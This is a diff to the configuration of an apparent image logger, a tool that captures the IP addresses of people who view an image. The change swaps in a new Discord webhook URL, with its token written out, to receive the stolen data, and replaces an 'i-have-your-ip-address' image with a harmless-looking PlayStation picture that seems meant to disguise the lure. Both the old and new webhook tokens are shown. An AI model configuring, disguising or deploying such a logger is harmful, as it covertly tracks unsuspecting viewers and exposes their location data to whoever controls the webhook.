@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1376940891700465725/R6diQybpsrpOaxXx3KxBcM1sdhPfCHNYTkhSC0sycZuq4XfwmZDiKMJQsrwfBci9Qc5O",
-    "image": "https://media.tenor.com/_6-bilomoRMAAAAe/i-have-your-ip-address-your.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1377657655207657597/kVwsdlXTw_GJs3Juet6gcsFzrBZtVgdIq6ZaAOBKbOC1LS6PHjk5ljlHJlyffQ070qZZ",
+    "image": "https://image.api.playstation.com/vulcan/ap/rnd/202011/0402/C784xeOFo2wViCf4m5bxgoeH.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
